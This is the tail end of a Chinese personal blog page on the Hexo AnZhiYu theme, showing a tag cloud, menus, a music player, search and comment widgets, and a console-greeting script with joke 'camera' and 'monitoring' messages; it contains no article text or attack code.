0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>